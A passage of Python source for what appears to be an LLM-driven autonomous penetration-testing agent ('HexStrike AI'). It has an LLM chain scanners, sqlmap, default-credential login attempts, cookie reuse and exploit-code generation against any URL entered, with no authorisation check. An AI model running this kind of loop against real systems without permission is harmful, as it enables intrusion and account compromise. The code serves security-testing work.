    print(f"⏸️  暂停原因: {reason.value}")
    print("="*70)
    
    # 展示当前进度
    print("\n📊 当前进度：")
    print(f"  - 目标: {session.target}")
    print(f"  - 已执行工具: {len(session.phase_history)}次")
    print(f"  - 发现信息: {len(session.findings)}条")
    print(f"  - 发现漏洞: {len(session.vulnerabilities)}个")
    print(f"  - 认证状态: {'✅ 已认证' if session.is_authenticated else '❌ 未认证'}")
    
    # 展示最近的发现
    if session.findings:
        print("\n🔍 最近发现的信息：")
        for finding in session.findings[-3:]:
            print(f"  • {finding}")
    
    # 展示漏洞详情
    if session.vulnerabilities:
        print("\n🚨 已发现的漏洞：")
        for i, vuln in enumerate(session.vulnerabilities, 1):
            print(f"\n  [{i}] {vuln.vuln_type} ({vuln.severity})")
            print(f"      置信度: {vuln.confidence:.0%}")
            print(f"      描述: {vuln.description}")
            if vuln.payload:
                print(f"      Payload: {vuln.payload}")
            if vuln.affected_url:
                print(f"      URL: {vuln.affected_url}")
            
            # 展示EXP代码
            if vuln.exploit_code or vuln.payload:
                exploit = generate_exploit_code(vuln, session)
                print(f"\n      💻 EXP代码：")
                print("      " + "─"*60)
                for line in exploit.split('\n')[:10]:  # 只显示前10行
                    print(f"      {line}")
                if len(exploit.split('\n')) > 10:
                    print("      ... (更多内容)")
                print("      " + "─"*60)
    
    print("\n" + "="*70)


def ask_user_next_action() -> str:
    """询问用户下一步操作（简化版）"""
    print("\n请选择下一步操作：")
    print("  [1] 继续测试其他漏洞")
    print("  [2] 生成完整报告并退出")
    print("  [3] 直接退出")
    
    while True:
        try:
            choice = input("\n请输入选项 (1-3): ").strip()
            if choice in ['1', '2', '3']:
                return choice
            print("❌ 无效输入，请输入 1-3")
        except (EOFError, KeyboardInterrupt):
            return '3'


def generate_final_report(session: PenTestSessionState) -> str:
    """生成最终渗透测试报告"""
    report_lines = [
        "\n" + "="*70,
        "📋 HexStrike AI - 渗透测试报告",
        "="*70,
        f"\n🎯 目标: {session.target}",
        f"⏱️  测试时间: {len(session.phase_history)}次工具调用",
        f"🔐 认证状态: {'✅ 已认证' if session.is_authenticated else '❌ 未认证'}",
    ]
    
    # 发现的信息
    if session.findings:
        report_lines.append(f"\n🔍 发现的信息 ({len(session.findings)}条)：")
        for i, finding in enumerate(session.findings, 1):
            report_lines.append(f"  {i}. {finding}")
    
    # 发现的漏洞
    if session.vulnerabilities:
        report_lines.append(f"\n🚨 发现的漏洞 ({len(session.vulnerabilities)}个)：")
        
        # 按严重程度分组
        critical = [v for v in session.vulnerabilities if v.severity == "CRITICAL"]
        high = [v for v in session.vulnerabilities if v.severity == "HIGH"]
        medium = [v for v in session.vulnerabilities if v.severity == "MEDIUM"]
        low = [v for v in session.vulnerabilities if v.severity == "LOW"]
        
        for severity, vulns in [("CRITICAL", critical), ("HIGH", high), ("MEDIUM", medium), ("LOW", low)]:
            if vulns:
                report_lines.append(f"\n  [{severity}] ({len(vulns)}个)")
                for vuln in vulns:
                    report_lines.append(f"    • {vuln.vuln_type}")
                    report_lines.append(f"      描述: {vuln.description}")
                    if vuln.payload:
                        report_lines.append(f"      Payload: {vuln.payload}")
                    if vuln.affected_url:
                        report_lines.append(f"      URL: {vuln.affected_url}")
                    
                    # EXP代码
                    exploit = generate_exploit_code(vuln, session)
                    report_lines.append(f"\n      💻 EXP代码：")
                    report_lines.append("      " + "─"*60)
                    for line in exploit.split('\n'):
                        report_lines.append(f"      {line}")
                    report_lines.append("      " + "─"*60)
                    
                    # 修复建议
                    if vuln.remediation:
                        report_lines.append(f"      🔧 修复建议: {vuln.remediation}")
    else:
        report_lines.append("\n✅ 未发现明显漏洞")
    
    # 工具调用历史
    report_lines.append(f"\n📊 工具调用历史：")
    for i, record in enumerate(session.phase_history[-10:], 1):
        status = "✅" if record.get("success") else "❌"
        report_lines.append(f"  {i}. {status} {record.get('action')} ({record.get('phase')})")
    
    report_lines.append("\n" + "="*70)
    report_lines.append("报告生成完成")
    report_lines.append("="*70 + "\n")
    
    return "\n".join(report_lines)


def validate_and_correct_decision(decision: Dict[str, Any], session: PenTestSessionState) -> Dict[str, Any]:
    """验证并纠正LLM的决策（保留用于兼容旧代码）"""
    return decision


def extract_target_from_text(text: str) -> Optional[str]:
    """Extract the first http/https URL from free-form text."""
    match = re.search(r"(https?://[^\s]+)", text)
    if match:
        return match.group(1).rstrip("，。；;)")
    return None


def detect_host_utility_request(text: str) -> Optional[Dict[str, Any]]:
    lowered = text.lower()
    if ("kali" in lowered or "本地" in text or "本机" in text) and ("桌面" in text or "desktop" in lowered) and ("文件" in text or "目录" in text):
        return {"action": "list_directory", "path": "~/Desktop"}
    return None


def update_session_from_result(action: str, result: Dict[str, Any], session: PenTestSessionState) -> None:
    """Update session state/phase and tool success scores.
    
    注意：result已经是提取后的实际结果（不是MCP包装格式）
    """
    session.last_action = action
    session.last_tool_results = result

    phase = session.phase or "init"
    success = bool(result.get("success", True))
    tool_name = None

    if action == "analyze_target" and result.get("success"):
        phase = "target_profile"
        tp = result.get("target_profile") or {}
        if isinstance(tp, dict) and tp:
            session.target_profile = tp
    elif action == "smart_scan":
        phase = "vuln_scan"
        scan_results = result.get("scan_results") or {}
        if isinstance(scan_results, dict):
            tp = scan_results.get("target_profile")
            if isinstance(tp, dict) and tp:
                session.target_profile = tp
            total_vulns = scan_results.get("total_vulnerabilities")
            if isinstance(total_vulns, int) and total_vulns > 0:
                session.status = "vuln_found"
    elif action == "run_nmap":
        tool_name = "nmap"
        phase = "recon"
    elif action == "run_gobuster":
        tool_name = "gobuster"
        phase = "discovery"
    elif action == "run_nuclei":
        tool_name = "nuclei"
        phase = "vuln_scan"
    elif action == "run_sqlmap":
        tool_name = "sqlmap"
        phase = "vuln_scan"
    elif action == "browser_visit":
        tool_name = "browser_visit"
        phase = "discovery"
    elif action == "crawl_site":
        tool_name = "crawl_site"
        phase = "discovery"
    elif action == "discover_params":
        tool_name = "discover_params"
        phase = "discovery"
    elif action == "smart_login":
        # 【修复】smart_login 不应该标记为 vuln_scan，而是 authentication
        phase = "authentication"
    elif action == "view_source":
        tool_name = "view_source"
        phase = "discovery"
    elif action == "analyze_code":
        tool_name = "analyze_code"
        phase = "analysis"
    elif action == "intelligent_quick_test":
        # 【v7.0新增】智能快速测试
        tool_name = "intelligent_quick_test"
        phase = "vuln_scan"  # 快速测试也算漏洞扫描阶段

    # 反馈学习：更新工具成功率
    if tool_name:
        if tool_name not in session.tool_success_scores:
            session.tool_success_scores[tool_name] = 0.5
        
        if success:
            session.tool_success_scores[tool_name] = min(1.0, session.tool_success_scores[tool_name] + 0.1)
        else:
            session.tool_success_scores[tool_name] = max(0.0, session.tool_success_scores[tool_name] - 0.1)

    session.phase = phase
    session.phase_history.append({"action": action, "phase": phase, "success": success})
    
    # 【新增】记录已完成的阶段
    if success and phase:
        session.completed_phases.add(phase)


def execute_action(
    action: str,
    params: Dict[str, Any],
    session: PenTestSessionState,
    client: HexstrikeMcpClient,
) -> Dict[str, Any]:
    """Execute one high-level action against the HexStrike server.
    
    注意：MCP工具返回格式为 {"result": {...}, "success": False}
    需要提取 result 字段作为实际结果
    """
    
    # 【修复】确保target参数存在
    if not params.get("target") and session.target:
        params["target"] = session.target
    
    target = str(params.get("target") or session.target)
    
    # 【P0新增】自动注入会话cookies到所有Web工具
    if action in ["run_sqlmap", "run_nuclei", "browser_visit", "crawl_site", "discover_params", "view_source", "intelligent_quick_test"]:
        from urllib.parse import urlparse
        try:
            parsed = urlparse(target)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            
            # 如果params中没有cookies，自动注入
            if not params.get("cookies"):
                # 优先使用session_cookies（当前活跃会话）
                if session.session_cookies:
                    params["cookies"] = session.session_cookies
                # 其次使用saved_cookies（按域名保存的）
                elif domain in session.saved_cookies and session.saved_cookies[domain]:
                    params["cookies"] = session.saved_cookies[domain]
                    session.session_cookies = session.saved_cookies[domain]
        except Exception as e:
            print(f"[会话管理] Cookie注入失败: {e}")

    if action == "analyze_target":
        session.status = "analyzing"
        result = client.analyze_target(target)
    elif action == "smart_scan":
        session.status = "scanning"
        objective = str(params.get("objective", "comprehensive"))
        max_tools = int(params.get("max_tools", 5))
        result = client.smart_scan(target, objective=objective, max_tools=max_tools)
    elif action == "run_nmap":
        session.status = "scanning"
        result = client.run_nmap(target, str(params.get("scan_type", "-sV")), str(params.get("ports", "")), str(params.get("additional_args", "")))
    elif action == "run_gobuster":
        session.status = "scanning"
        result = client.run_gobuster(target, str(params.get("mode", "dir")), str(params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")), str(params.get("additional_args", "")))
    elif action == "run_nuclei":
        session.status = "scanning"
        result = client.run_nuclei(target, str(params.get("severity", "")), str(params.get("tags", "")), str(params.get("template", "")), str(params.get("additional_args", "")))
    elif action == "run_sqlmap":
        session.status = "scanning"
        result = client.run_sqlmap(
            target, 
            str(params.get("data", "")), 
            str(params.get("additional_args", "")),
            params.get("cookies")  # 【P0新增】
        )
    elif action == "browser_visit":
        session.status = "analyzing"
        result = client.browser_visit(
            target, 
            int(params.get("timeout", 10)), 
            bool(params.get("follow_redirects", True)),
            params.get("cookies")  # 【P0新增】
        )
    elif action == "crawl_site":
        session.status = "scanning"
        result = client.crawl_site(
            target, 
            int(params.get("max_depth", 2)), 
            int(params.get("max_urls", 100)), 
            bool(params.get("include_subdomains", False)), 
            str(params.get("additional_args", "")),
            params.get("cookies")  # 【P0新增】
        )
    elif action == "discover_params":
        session.status = "analyzing"
        result = client.discover_params(
            target, 
            str(params.get("method", "GET")), 
            str(params.get("test_depth", "basic")),
            params.get("cookies")  # 【P0新增】
        )
    elif action == "smart_login":
        session.status = "authenticating"
        result = client.smart_login(
            target,
            str(params.get("username", "")),
            str(params.get("password", "")),
            bool(params.get("try_defaults", True))
        )
    elif action == "view_source":
        session.status = "analyzing"
        result = client.view_source(
            target,
            params.get("cookies")
        )
    elif action == "analyze_code":
        session.status = "analyzing"
        result = client.analyze_code(
            str(params.get("source_code", "")),
            str(params.get("language", "php")),
            target
        )
    elif action == "intelligent_quick_test":
        # 【v7.0新增】LLM驱动的智能快速测试
        session.status = "testing"
        result = client.intelligent_quick_test(
            target,
            str(params.get("vuln_type", "xss")),
            params.get("context", {}),
            params.get("cookies"),
            int(params.get("max_payloads", 5))
        )
    elif action == "request_user_credentials":
        # 特殊动作：请求用户输入凭据
        result = {"success": True, "action": "request_user_credentials", "target": target}
    else:
        result = {"success": False, "error": f"Unknown action: {action}"}

    # 【MCP格式统一处理】提取实际结果
    # MCP返回格式：{"result": {...}, "success": False}
    # 我们需要的是 result 字段里的内容
    if "result" in result and isinstance(result["result"], dict):
        actual_result = result["result"]
    else:
        actual_result = result

    update_session_from_result(action, actual_result, session)
    return actual_result


def interactive_loop(args: argparse.Namespace) -> None:
    """ReAct模式主循环 - 使用原生Function Calling（对标CherryStudio架构）
    
    架构：LLM Function Calling ↔ MCP JSON ↔ 递归 Agent Loop
    - LLM层：使用原生tool_calls返回调用意图
    - MCP层：JSON格式执行工具并返回结果
    - Agent层：递归循环，用role:"tool"注入上下文
    
    GraphRAG模式：
    - 启用时：根据目标智能筛选工具（10-30个）
    - 禁用时：传递全量工具（160+个）
    
    Phase-Aware模式：
    - 启用时：根据渗透阶段动态推荐工具
    - 禁用时：不进行阶段感知
    """
    client = HexstrikeMcpClient(args.server_url, timeout=args.timeout)
    llm = LLMClient()
    session = PenTestSessionState(target=args.target or "")
    
    # 构建OpenAI格式的工具定义（全量）
    all_openai_tools = build_openai_tools_from_mcp(client)
    
    # GraphRAG初始化
    tool_selector = None
    use_graphrag = args.enable_graphrag and GRAPHRAG_AVAILABLE
    
    if use_graphrag:
        try:
            tool_selector = HexStrikeToolSelector()
            print(f"[GraphRAG] ✅ 知识图谱已加载")
            stats = tool_selector.graph.stats()
            print(f"[GraphRAG] 工具数: {stats['total_tools']}, 场景数: {stats['total_scenarios']}, 边数: {stats['total_edges']}")
        except Exception as e:
            print(f"[GraphRAG] ❌ 初始化失败: {e}")
            use_graphrag = False
    
    # Phase-Aware初始化
    phase_selector = None
    use_phase_aware = args.enable_phase_aware and PHASE_AWARE_AVAILABLE
    pentest_context = None  # 动态上下文
    
    if use_phase_aware:
        try:
            phase_selector = PhaseAwareToolSelector()
            print(f"[Phase-Aware] ✅ 阶段感知已启用")
        except Exception as e:
            print(f"[Phase-Aware] ❌ 初始化失败: {e}")
            use_phase_aware = False

    print("=" * 70)
    print("🧠 HexStrike AI - Function Calling模式（对标CherryStudio架构）")
    print("=" * 70)
    print(f"HexStrike server: {args.server_url}")
    print(f"最大轮次: {args.max_autonomous_rounds}")
    print(f"GraphRAG: {'✅ 启用' if use_graphrag else '❌ 禁用'}")
    print(f"Phase-Aware: {'✅ 启用' if use_phase_aware else '❌ 禁用'}")
    print(f"全量工具数量: {len(all_openai_tools)}")
    print("=" * 70)

    # 连接检查
    try:
        health = client.health()
        health_data = health.get("result", health)
        is_healthy = (
            health.get("success", False) or 
            health_data.get("status", "").lower() == "healthy"
        )
        status = "✅ 正常" if is_healthy else "❌ 异常"
        print(f"[连接检查] {status}")
    except Exception as exc:
        print(f"[连接检查] 失败: {exc}")
    
    if session.target:
        print(f"目标: {session.target}")
    print("\n输入渗透测试目标URL开始测试，或直接对话。输入 'exit' 结束。\n")

    # 初始化消息历史（OpenAI格式）
    messages: List[Dict[str, Any]] = [
        {"role": "system", "content": HEXSTRIKE_SYSTEM_PROMPT}
    ]

    while True:
        try:
            user_input = input("你> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if not user_input or user_input.lower() in {"exit", "quit"}:
            break

        # 保存用户指令
        session.user_instruction = user_input
        
        # GraphRAG推荐列表（在分析目标后填充）
        graphrag_recommendations = []
        # Phase-Aware推荐列表
        phase_recommendations = []
        
        # 提取目标URL
        new_target = extract_target_from_text(user_input)
        if new_target:
            session.target = new_target
            print(f"[系统] 已识别到渗透目标: {session.target}")
            if user_input.strip() != new_target:
                print(f"[系统] 用户指令: {user_input}\n")
            else:
                print()
            
            # Phase-Aware: 初始化渗透上下文
            if use_phase_aware and phase_selector:
                pentest_context = phase_selector.initialize_context(session.target)
                print(f"\n[Phase-Aware] 输入类型: {pentest_context.input_type.value}")
                print(f"[Phase-Aware] 起始阶段: {pentest_context.current_phase}")
        
        # 添加用户消息
        if session.target:
            # 有目标URL，构建上下文提示（包含GraphRAG推荐和渗透上下文）
            context_prompt = build_react_prompt(
                session, 
                graphrag_recommendations=graphrag_recommendations,
                pentest_context=pentest_context
            )
            messages.append({"role": "user", "content": f"{user_input}\n\n{context_prompt}"})
        else:
            # 普通对话
            messages.append({"role": "user", "content": user_input})
        
        # ============================================================
        # 递归Agent Loop（对标CherryStudio）
        # ============================================================
        max_iterations = args.max_autonomous_rounds
        iteration = 0
        
        # 工具筛选（在循环开始前进行）
        openai_tools = all_openai_tools  # 默认使用全量工具
        graphrag_recommendations = []
        phase_recommendations = []
        
        # ============================================================
        # 工具筛选策略（Phase-Aware + GraphRAG 协作）
        # ============================================================
        
        # 模式1：Phase-Aware + GraphRAG 协作（两者都启用）
        if use_phase_aware and use_graphrag and phase_selector and tool_selector and pentest_context:
            try:
                # Phase-Aware 输出阶段意图
                phase_intent = phase_selector.get_phase_intent(pentest_context)
                context_features = ContextUpdater.extract_context_features(pentest_context)
                
                print(f"\n[Phase-Aware + GraphRAG 协作模式]")
                print(f"  📍 当前阶段: {pentest_context.current_phase}")
                print(f"  🎯 阶段意图: {phase_intent.get('intent', '')}")
                print(f"  📊 上下文特征: {', '.join(context_features[:5]) if context_features else '无'}")
                print(f"  🔍 允许场景: {', '.join(phase_intent.get('scenarios', [])[:8])}...")
                
                # GraphRAG 结合阶段意图选择工具
                recommendations = tool_selector.select_tools_with_phase_intent(
                    session.target,
                    phase_intent,
                    context_features,
                    context={'user_instruction': user_input},
                    max_tools=30
                )
                
                if recommendations:
                    graphrag_recommendations = [r.tool_name for r in recommendations[:10]]
                    print(f"  🔧 推荐工具({len(recommendations)}个): {', '.join(graphrag_recommendations)}")
                    
                    # 显示推荐理由（前5个）
                    for rec in recommendations[:5]:
                        reasons_str = ', '.join(rec.reasons[:2])
                        print(f"    - {rec.tool_name} (分数:{rec.score:.1f}): {reasons_str}")
                    
                    # 筛选工具列表
                    openai_tools = tool_selector.filter_tools_by_openai_format(
                        all_openai_tools, recommendations
                    )
                    print(f"  ✅ 筛选后工具数: {len(openai_tools)}")
                
            except Exception as e:
                print(f"[协作模式] ⚠️ 分析失败: {e}，回退到独立模式")
                import traceback
                traceback.print_exc()
        
        # 模式2：只启用 Phase-Aware（独立模式）
        elif use_phase_aware and phase_selector and pentest_context:
            try:
                # 获取阶段推荐工具（独立模式）
                phase_recs = phase_selector.select_tools(pentest_context, max_tools=25)
                
                if phase_recs:
                    phase_recommendations = [r.tool_name for r in phase_recs[:10]]
                    print(f"\n[Phase-Aware 独立模式]")
                    print(f"  📍 当前阶段: {pentest_context.current_phase}")
                    print(f"  🔧 推荐工具({len(phase_recs)}个): {', '.join(phase_recommendations)}")
                    
                    # 显示推荐理由
                    for rec in phase_recs[:5]:
                        print(f"    - {rec.tool_name}: {', '.join(rec.reasons)}")
                    
                    # 筛选工具列表
                    openai_tools = filter_tools_by_phase_recommendations(
                        all_openai_tools, phase_recs
                    )
                    print(f"  ✅ 筛选后工具数: {len(openai_tools)}")
                
            except Exception as e:
                print(f"[Phase-Aware] ⚠️ 分析失败: {e}")
        
        # 模式3：只启用 GraphRAG（独立模式）
        elif use_graphrag and tool_selector and session.target:
            try:
                # 分析目标
                analysis = tool_selector.analyze_input(session.target, {
                    'user_instruction': user_input,
                    'is_authenticated': session.is_authenticated,
                })
                
                print(f"\n[GraphRAG 独立模式]")
                print(f"  📍 识别场景: {', '.join(analysis.scenarios)}")
                print(f"  🎯 目标类型: {', '.join(analysis.targets)}")
                print(f"  📊 当前阶段: {analysis.phase}")
                print(f"  💡 推理: {analysis.reasoning}")
                
                # 获取推荐工具
                recommendations = tool_selector.select_tools(
                    session.target, 
                    context={'user_instruction': user_input},
                    max_tools=30
                )
                
                if recommendations:
                    graphrag_recommendations = [r.tool_name for r in recommendations[:10]]
                    print(f"  🔧 推荐工具({len(recommendations)}个): {', '.join(graphrag_recommendations)}")
                    
                    # 筛选工具列表
                    openai_tools = tool_selector.filter_tools_by_openai_format(
                        all_openai_tools, recommendations
                    )
                    print(f"  ✅ 筛选后工具数: {len(openai_tools)}")
                
            except Exception as e:
                print(f"[GraphRAG] ⚠️ 分析失败: {e}，使用全量工具")
                openai_tools = all_openai_tools
        
        # 模式4：基线模式（都不启用）- 注意可能超过API限制
        else:
            if session.target:
                print(f"\n[基线模式] 使用全量工具 ({len(all_openai_tools)}个)")
                if len(all_openai_tools) > 128:
                    print(f"  ⚠️ 警告: 工具数量({len(all_openai_tools)})超过API限制(128)，可能报错")
        
        while iteration < max_iterations:
            iteration += 1
            session.iteration_count = iteration
            
            print(f"\n{'='*70}")
            print(f"🔄 轮次 {iteration}/{max_iterations}")
            print(f"{'='*70}")
            
            # 调用LLM（带工具）
            print("🧠 [LLM思考中...]")
            
            # 决定是否使用工具
            use_tools_for_call = bool(session.target)  # 有目标时才使用工具
            
            if use_tools_for_call:
                response = llm.chat_with_tools(
                    messages=messages,
                    tools=openai_tools,
                    temperature=0.2,
                    tool_choice="auto"
                )
            else:
                # 普通对话，不带工具
                text_response = llm.chat(messages, temperature=0.2)
                response = {
                    "content": text_response,
                    "tool_calls": None,
                    "finish_reason": "stop"
                }
            
            content = response.get("content")
            tool_calls = response.get("tool_calls")
            finish_reason = response.get("finish_reason")
            
            # 显示LLM的文本回复
            if content:
                print(f"\n💭 [LLM回复]\n{content}\n")
            
            # 检查是否有工具调用
            if tool_calls:
                # 将assistant消息（包含tool_calls）添加到历史
                assistant_message = {"role": "assistant", "content": content}
                if response.get("raw_message"):
                    assistant_message = response["raw_message"]
                messages.append(assistant_message)
                
                # 【新增】发现漏洞标志，用于中断后续工具调用
                vuln_found_in_batch = False
                
                # 执行每个工具调用
                for tool_call in tool_calls:
                    tool_id = tool_call.get("id", "")
                    function = tool_call.get("function", {})
                    tool_name = function.get("name", "")
                    
                    # 解析参数
                    try:
                        arguments = json.loads(function.get("arguments", "{}"))
                    except json.JSONDecodeError:
                        arguments = {}
                    
                    print(f"\n🔧 [执行工具] {tool_name}")
                    print(f"📝 [参数] {json.dumps(arguments, ensure_ascii=False)}")
                    
                    # 执行工具
                    result = execute_tool_call(tool_name, arguments, session, client)
                    
                    # 【关键】增强结果解析：从stdout解析漏洞信息
                    result = enhance_vuln_result(tool_name, result)
                    
                    # 格式化结果
                    formatted_result = format_tool_result_for_llm(tool_name, result)
                    
                    # 显示结果
                    if result.get("success"):
                        print(f"✅ [成功] {tool_name}")
                    else:
                        print(f"❌ [失败] {tool_name}")
                    print(f"\n{formatted_result}\n")
                    
                    # 【关键】用role:"tool"注入工具结果（对标CherryStudio）
                    tool_result_message = {
                        "role": "tool",
                        "tool_call_id": tool_id,
                        "content": formatted_result
                    }
                    messages.append(tool_result_message)
                    
                    # 更新工具成功率
                    if tool_name in session.tool_success_scores:
                        if result.get("success"):
                            session.tool_success_scores[tool_name] = min(1.0, session.tool_success_scores[tool_name] + 0.1)
                        else:
                            session.tool_success_scores[tool_name] = max(0.0, session.tool_success_scores[tool_name] - 0.1)
                    else:
                        session.tool_success_scores[tool_name] = 0.8 if result.get("success") else 0.3
                    
                    # Phase-Aware: 更新上下文
                    if use_phase_aware and pentest_context:
                        try:
                            ContextUpdater.update(pentest_context, tool_name, result)
                            
                            # 【关键】更新漏洞测试状态（让LLM知道哪些漏洞类型已测试）
                            ContextUpdater.update_vuln_test_status(pentest_context, tool_name, result)
                            
                            # 检查是否需要阶段推进
                            should_advance, new_phase = PhaseTransitionRules.should_advance(pentest_context)
                            if should_advance:
                                old_phase = pentest_context.current_phase
                                advance_phase(pentest_context, new_phase)
                                print(f"\n[Phase-Aware] 🔄 阶段推进: {old_phase} → {new_phase}")
                                
                                # 根据模式重新获取工具推荐
                                if use_graphrag and tool_selector:
                                    # 协作模式：Phase-Aware + GraphRAG
                                    phase_intent = phase_selector.get_phase_intent(pentest_context)
                                    context_features = ContextUpdater.extract_context_features(pentest_context)
                                    
                                    recommendations = tool_selector.select_tools_with_phase_intent(
                                        session.target,
                                        phase_intent,
                                        context_features,
                                        context={'user_instruction': user_input},
                                        max_tools=30
                                    )
                                    if recommendations:
                                        openai_tools = tool_selector.filter_tools_by_openai_format(
                                            all_openai_tools, recommendations
                                        )
                                        print(f"[协作模式] 🔧 新阶段推荐工具: {', '.join([r.tool_name for r in recommendations[:5]])}")
                                else:
                                    # 独立模式：只用 Phase-Aware
                                    phase_recs = phase_selector.select_tools(pentest_context, max_tools=25)
                                    if phase_recs:
                                        openai_tools = filter_tools_by_phase_recommendations(
                                            all_openai_tools, phase_recs
                                        )
                                        print(f"[Phase-Aware] 🔧 新阶段推荐工具: {', '.join([r.tool_name for r in phase_recs[:5]])}")
                            
                            # 【新增】显示漏洞测试状态变化
                            if pentest_context.vuln_test_status:
                                found_vulns = [k for k, v in pentest_context.vuln_test_status.items() if v == "found"]
                                tested_vulns = [k for k, v in pentest_context.vuln_test_status.items() if v == "not_found"]
                                if found_vulns:
                                    print(f"[Phase-Aware] ✅ 已确认漏洞类型: {found_vulns}")
                                if tested_vulns:
                                    print(f"[Phase-Aware] ❌ 已测试无漏洞: {tested_vulns}")
                                    
                        except Exception as e:
                            print(f"[Phase-Aware] ⚠️ 上下文更新失败: {e}")
                    
                    # 检查是否发现漏洞
                    if result.get("vulnerable"):
                        vuln_report = VulnerabilityReport(
                            vuln_type=result.get("vuln_type", "Unknown"),
                            severity=result.get("severity", "MEDIUM"),
                            confidence=result.get("confidence", 0.8),
                            description=result.get("description", f"{tool_name}发现漏洞"),
                            payload=result.get("payload") or result.get("successful_payload"),
                            exploit_code=result.get("exploit_code"),
                            affected_url=result.get("url") or session.target
                        )
                        session.vulnerabilities.append(vuln_report)
                        session.findings.append(f"{tool_name}发现{vuln_report.vuln_type}漏洞")
                        
                        # 暂停并询问用户
                        print(f"\n🚨 [发现漏洞] {vuln_report.vuln_type} ({vuln_report.severity})")
                        display_progress_report(session, PauseReason.VULNERABILITY_WITH_EXP)
                        
                        user_choice = ask_user_next_action()
                        if user_choice == '2':
                            final_report = generate_final_report(session)
                            print(final_report)
                            return
                        elif user_choice == '3':
                            print("\n👋 退出测试")
                            return
                        
                        # 【关键】发现漏洞后，中断当前批次的剩余工具调用
                        vuln_found_in_batch = True
                        remaining_tools = len(tool_calls) - tool_calls.index(tool_call) - 1
                        if remaining_tools > 0:
                            print(f"\n⏹️  [发现即停止] 已发现漏洞，跳过剩余 {remaining_tools} 个工具调用")
                            # 为剩余的tool_calls添加空结果（OpenAI要求每个tool_call都有对应的tool消息）
                            for remaining_call in tool_calls[tool_calls.index(tool_call) + 1:]:
                                remaining_id = remaining_call.get("id", "")
                                remaining_name = remaining_call.get("function", {}).get("name", "")
                                messages.append({
                                    "role": "tool",
                                    "tool_call_id": remaining_id,
                                    "content": f"⏹️ 已跳过 {remaining_name}：前序工具已发现漏洞，无需继续测试同类型漏洞"
                                })
                        break  # 中断for循环
                
                # 继续循环，让LLM看到工具结果
                continue
            
            else:
                # 没有工具调用，检查finish_reason
                if finish_reason == "stop":
                    # LLM完成了回复，添加到历史
                    messages.append({"role": "assistant", "content": content or ""})
                    
                    # 如果是普通对话或任务完成，退出循环
                    if not session.target or "完成" in (content or "") or "结束" in (content or ""):
                        break
                    
                    # 否则等待用户下一个输入
                    break
                else:
                    # 其他情况，添加响应并继续
                    messages.append({"role": "assistant", "content": content or ""})
                    break
        
        # 循环结束
        if iteration >= max_iterations:
            print(f"\n{'='*70}")
            print(f"⏱️  [超时] 已达到最大轮次限制 ({max_iterations})")
            print(f"{'='*70}\n")
            final_report = generate_final_report(session)
            print(final_report)
        
        # 重置状态
        session.iteration_count = 0
        session.findings = []
        session.vulnerabilities = []
        session.is_authenticated = False
        session.session_cookies = {}
        session.pause_count = 0
        session.user_choice_history = []
        session.last_vuln_count = 0
        session.user_instruction = ""
        print("\n")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Balance AI - ReAct模式渗透测试")
    parser.add_argument("--server-url", type=str, default="http://127.0.0.1:8888")
    parser.add_argument("--target", type=str, default="")
    parser.add_argument("--timeout", type=int, default=300)
    parser.add_argument("--enable-graphrag", action="store_true", default=False, 
                       help="启用GraphRAG工具筛选")
    parser.add_argument("--enable-phase-aware", action="store_true", default=False,
                       help="启用阶段感知机制")
    parser.add_argument("--max-autonomous-rounds", type=int, default=50, 
                       help="最大循环轮次（默认50）")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    interactive_loop(args)


if __name__ == "__main__":
    main()
